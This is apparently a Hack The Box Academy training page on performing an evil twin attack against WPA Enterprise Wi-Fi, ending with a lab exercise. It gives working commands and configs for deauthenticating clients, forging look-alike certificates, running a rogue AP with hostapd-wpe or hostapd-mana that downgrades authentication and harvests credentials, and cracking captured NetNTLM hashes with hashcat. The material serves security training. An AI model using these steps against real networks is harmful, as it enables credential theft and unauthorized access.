
<h1>Enterprise Evil Twin Attack</h1>
<hr/>
<p>Performing an evil twin attack on WPA Enterprise networks differs significantly from attacks on WPA2 or WPA3 networks. Unlike the latter, where a shared pre-shared key (PSK) is used, WPA Enterprise assigns each user their own unique set of credentials. To execute the attack, the attacker sets up a rogue enterprise access point (AP) configured with a RADIUS server. This rogue RADIUS server is designed to accept all authentication requests, regardless of validity. Additionally, the rogue AP is given an identical name (SSID) to the legitimate AP, making it more likely that users will unknowingly connect to it.</p>
<p><img alt="enterprise" src="https://academy.hackthebox.com/storage/modules/291/enterprise/enterprise.png"/></p>
<p>If users connect using challenge-response-based authentication methods such as <code>CHAP</code>, <code>MSCHAP</code>, or <code>MSCHAPv2</code>, we can capture their authentication hashes. These hashes can then be brute-forced locally to recover the credentials or used in a <code>PEAP relay attack</code> to forward the captured hash to the legitimate access point (AP) for authentication. For users connecting with plain-text authentication methods like <code>GTC</code>, their credentials can be obtained directly in clear text. However, if users connect using certificate-based authentication methods like <code>EAP-TLS</code>, we can assess whether their devices are improperly configured to trust a rogue AP with a fraudulent certificate. If they are vulnerable, we can exploit this misconfiguration to perform man-in-the-middle (MITM) attacks once they are connected to the rogue AP.</p>
<p>For a detailed exploration of these attacks and how they work, check out the <a href="https://academy.hackthebox.com/module/details/282">Attacking WPA/WPA2 Wi-Fi Networks</a> module. It provides in-depth insights and practical guidance for understanding and implementing these techniques effectively.</p>
<p>Here are the five steps to perform the attack:</p>
<ol>
<li>
<code>Scan for the Target</code>: Identify the target access point by discovering its SSID and other details.</li>
<li>
<code>Generate Certificates</code>: Create certificates that closely mimic the target’s certificate details to increase the likelihood of users trusting the rogue AP.</li>
<li>
<code>Host the Rogue AP</code>: Set up a rogue access point using tools like hostapd-mana or hostapd-wpe to replicate the target network.</li>
<li>
<code>Deauthenticate Connected Clients</code>: Send deauthentication packets to disconnect users from the legitimate access point, forcing them to connect to the rogue AP.</li>
<li>
<code>Capture the Credentials</code>: Collect user credentials or authentication hashes depending on the method used by the clients (e.g., clear text for GTC or hashes for MSCHAPv2).</li>
</ol>
<hr/>
<h2>Performing the attack</h2>
<h3>1. Scan for the Target</h3>
<p>The first step is to identify the target access point by discovering its SSID and gathering additional details, such as its certificate information. This helps ensure the rogue AP closely mimics the legitimate one, increasing the likelihood of user connections. To start capturing WPA handshake data, once we've our interface in monitor mode, we can use <code>airodump-ng</code> with the <code>-w</code> WPA argument to save the scan output into a file with the WPA prefix. This process will create a <code>WPA-01.cap</code> file, which will automatically update with new data as the scan continues.</p>
<pre><code class="language-shell-session">[!bash!]$ airmon-ng start wlan0
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon -c 1 -w WPA

 CH  1 ][ Elapsed: 36 s ][ 2024-08-23 10:19 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100      372       77    0   1   54   WPA2 CCMP   MGT  HTB-Wireless                                                                                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  9A:B7:A6:32:F3:D6  -29    9 -48      0       95  PMKID  HTB-Wireless    
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ aireplay-ng -0 1  -a 9C:9A:03:39:BD:7A -c 9A:B7:A6:32:F3:D6 wlan0mon

19:41:12  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]
</code></pre>
<p>Once we have captured the WPA handshake, we can use the <code>WPA-01.cap</code> file to extract important details such as the username, domain name, and handshake certificate from the captured data. To obtain the handshake certificate using <code>Wireshark</code>, we can apply the filter <code>(wlan.sa == 9c:9a:03:39:bd:7a) &amp;&amp; (tls.handshake.certificate)</code>. This filter focuses on the AP's BSSID to isolate the relevant packet containing the certificate. The extracted certificate can provide valuable information about the access point as shown in the below screenshot.</p>
<p><img alt="handshake" src="https://academy.hackthebox.com/storage/modules/291/handshake.png"/></p>
<hr/>
<h3>2. Generate Certificates</h3>
<p>Next, we generate certificates that closely mimic the details of the target’s certificate. This similarity increases the chances of clients trusting and connecting to the rogue access point. The first step is to generate our Diffie-Hellman parameters. This can be done using the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ openssl dhparam -out dh.pem 2048

Generating DH parameters, 2048 bit long safe prime
..........................................................................................................................................................................................................................................................................................+......................................................................++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*
</code></pre>
<p>Next, we need to generate our Certificate Authority (CA) key. This can be accomplished with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ openssl genrsa -out ca-key.pem 2048
</code></pre>
<p>We also need to generate the x509 certificate to create our final ca.pem file. We'll aim to closely match the details of the legitimate access point, to minimize suspicion from connected clients and prevent them from realizing it's a fake AP.</p>
<pre><code class="language-shell-session">[!bash!]$ openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:<a class="__cf_email__" data-cfemail="89e8ede4e0e7c9e1fdeba7eae6e4" href="/cdn-cgi/l/email-protection">[email protected]</a>
</code></pre>
<p>When generating our x509 certificates, we should aim to make the information as similar as possible to that of the actual target. If we have access to a certificate from the internal network, using it would be preferable to self-signed certificates, as it may be trusted by the client devices.</p>
<p>At this stage, we need to generate our server certificate and private key, as specified in the hostapd.conf file. This can be done with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem

Ignoring -days without -x509; not generating a certificate
.....+......+.....+....+++++++++++++++++++++++++++++++++++++++*......+....+...+..+.+..+++++++++++++++++++++++++++++++++++++++*.+..+.......+..+......+...+.+...+........+...+....+...+.....+....+...+.....+.+..+...+....+.......
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:<a class="__cf_email__" data-cfemail="d4b5b0b9bdba94bca0b6fab7bbb9" href="/cdn-cgi/l/email-protection">[email protected]</a>

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:challenge1234
An optional company name []:
</code></pre>
<p>We should ensure that the information in our new x509 certificate matches the details from the previous certificate, as this will make our attack appear more legitimate. Additionally, the challenge password used should match the one specified in the .eap_user file. Finally, we need to generate the x509 certificate for the server. This can be done with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem

Certificate request self-signature ok
subject=C=US, ST=California, L=San Fransisco, O=Hack The Box, OU=HTB, CN=HTB, <a class="__cf_email__" data-cfemail="294c44484045684d4d5b4c5a5a14484d44404769415d4b074a4644" href="/cdn-cgi/l/email-protection">[email protected]</a>
</code></pre>
<hr/>
<h3>3. Host the Rogue AP</h3>
<p>Now, we finally host our rogue enterprise access point. We can use tools like <a href="https://github.com/sensepost/hostapd-mana">Hostapd-mana</a> or <a href="https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe">hostapd-wpe</a> to set up the rogue AP and replicate the target network's behavior.</p>
<p>To get started, we need to create a hostapd.conf file with the following content:</p>
<pre><code class="language-configuration"># 802.11 Options
interface=wlan1
ssid=HTB-Wireless
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user


# Certificates

ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem
</code></pre>
<p>Next, to gain refined control over EAP method negotiation between our fake access point and the client, we need to create the <code>hostapd.eap_user</code> file referenced in our hostapd.conf file for Mana with the following content:</p>
<pre><code class="language-configuration">* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]
</code></pre>
<p>With this <code>hostapd.eap_user</code> file, we instruct client devices attempting to join our network to use <code>TTLS-PAP</code> as their authentication method. In 802.1x security, the client and access point negotiate which method to use. By specifying the order of methods—starting with TTLS-PAP, then GTC, followed by TTLS-CHAP, TTLS-MSCHAP, and so on-we can potentially trick vulnerable client devices into using TTLS-PAP or GTC, thereby exposing their cleartext identity and credentials. Additionally, we specify the challenge password <code>challenge1234</code>, which was used in the generation of our server's private keys.</p>
<p>At this stage, we can start the rogue access point using <code>hostapd-wpe</code> with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo hostapd-wpe -c -k hostapd.conf

rfkill: Cannot open RFKILL control device                                                                                                                   
random: Only 15/20 bytes of strong random data available                                                                                                    
random: Not enough entropy pool available for secure operations                                                                                             
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects                                            
wlan1: interface state UNINITIALIZED-&gt;ENABLED                                                                                                               
wlan1: AP-ENABLED
</code></pre>
<p>Here’s an explanation of the options used with hostapd-wpe:</p>
<ul>
<li>
<code>-c Cupid Mode</code>: Enables Heartbleed vulnerability testing for connected clients. This mode attempts to exploit vulnerable devices by leveraging the Heartbleed bug in OpenSSL.</li>
<li>
<code>-k Karma Mode</code>: Configures the rogue AP to respond to all probe requests, effectively tricking clients into connecting by mimicking their preferred networks.</li>
</ul>
<p>Optionally, if we prefer to use <code>hostapd-mana</code> to host the rogue AP, we will need to enable Karma Mode (Mana) in the configuration file. Unlike <code>hostapd-wpe</code>, which allows us to specify Karma Mode directly via the command line argument (-k), <code>hostapd-mana</code> requires us to configure it within the file itself. This setup allows the rogue AP to respond to all probe requests.</p>
<p>To use hostapd-mana, <code>append</code> the configuration <code>hostapd.conf</code> file with following:</p>
<pre><code class="language-configuration">enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
</code></pre>
<ul>
<li>
<code>enable_mana=1</code>: Enables Karma (mana) mode to respond to all probe requests.</li>
<li>
<code>mana_loud=1</code>: Makes the rogue AP more noticeable by aggressively responding to probe requests, increasing the chances of clients connecting.</li>
<li>
<code>mana_credout=credentials.creds</code>: Specifies the file where captured credentials will be saved.</li>
<li>
<code>mana_eapsuccess=1</code>: Forces a successful EAP authentication, even if the client doesn’t complete the full process.</li>
<li>
<code>mana_wpe=1</code>: Enables WPA Enterprise functionality, making the rogue AP act as an enterprise AP for relaying captured credentials.</li>
</ul>
<p>To start the rogue AP using hostapd-mana we use following command:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Wireless"
random: Only 18/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED-&gt;ENABLED
wlan1: AP-ENABLED 
</code></pre>
<hr/>
<h3>4. Deauthenticate Connected Clients</h3>
<p>If everything is set up correctly, our access point should be operational and ready to capture credentials from client devices. To observe our access point in action and monitor the connectivity of client devices, we can start an <code>airodump-ng</code> session in a second terminal.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon -c 1


 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:11:22:33:44:00  -28 100       97        0    0   1   54   WPA2 CCMP   MGT  HTB-Wireless
 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  16:C5:68:79:A8:12  -29   12 -54      0        4
</code></pre>
<p>From the airodump-ng output, we can see that our fake access point, named <code>HTB-Wireless</code>, has been successfully created. Now, we need to wait for clients to connect to our network.</p>
<p>If, after some time, connected clients do not automatically switch to our network due to the KARMA attack (and they remain associated with the original access point in our airodump-ng session), we may need to perform a <code>deauthentication attack</code>. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying the target access point's BSSID and the client’s MAC address.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo aireplay-ng -0 6 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon

09:57:49  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
09:57:49  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
</code></pre>
<hr/>
<h3>5. Capture the Credentials</h3>
<p>Once a client successfully connects to our fake access point and EAP negotiation is successful, we should observe output similar to the following in the hostapd-mana/hostapd-wpe tab:</p>
<pre><code class="language-shell-session">wlan1: AP-ENABLED 
MANA - Directed probe request for SSID 'HTB-Wireless' from 16:C5:68:79:A8:12
MANA - Directed probe request for SSID 'HTB-Wireless' from 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 12:c2:9c:78:a6:0d IEEE 802.1X: Identity received from STA: 'HTB\Administrator'

mschapv2: Wed Aug 21 12:52:31 2024
	 username:			HTB\Administrator
	 challenge:			45:14:53:22:49:08:8c:58
	 response:			10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:			Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:		Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s
</code></pre>
<p>To begin our attempt at cracking the hash (in order to gain access to our target access point), we need to choose a suitable wordlist, which may include our end user's password. Once we have located the desired wordlist, we can employ the following command to run a password cracking attack against our captured hash. We specify <code>-m 5500</code> for the correct hash mode, <code>-a 0</code> for the attack mode, our captured <code>NetNTLM</code> hash in Hashcat format, and finally, the dictionary file we will attempt cracking with.</p>
<pre><code class="language-shell-session">[!bash!]$ hashcat -m 5500 -a 0 Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s wordlist.dict

&lt;snip&gt;

Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s:Wowwhatasecurepassword123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: Administrator::::54as56d65asasd55asd564asd564asd55...4d1a2s
Time.Started.....: Day Mon 12 34:56:78 xxxx (0 secs)
Time.Estimated...: Day Mon 12 34:56:78 xxxx (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlist.dict)
Guess.Queue......: 1/10000 (100.00%)
Speed.#1.........:     1733 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/10000 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Wowwhatasecurepassword123 -&gt; Wowwhatasecurepassword123
Hardware.Mon.#1..: Temp: 54c Fan:  0% Util: 29% Core:1882MHz Mem:7300MHz Bus:16
</code></pre>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> If <b>Hashcat</b> does not work within the provided attacker VM, it is recommended to use <b>Pwnbox</b> or your <b>local VM</b> to run Hashcat.
</div>
<p>At this stage, we will have obtained the correct password to access our target network or carry out other malicious actions.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2838 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2838"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Perform the enterprise evil twin attack as demonstrated in this section. What is the password obtained for user Sentinal.Jr?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2838" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2838">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2838" id="btnAnswer2838">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
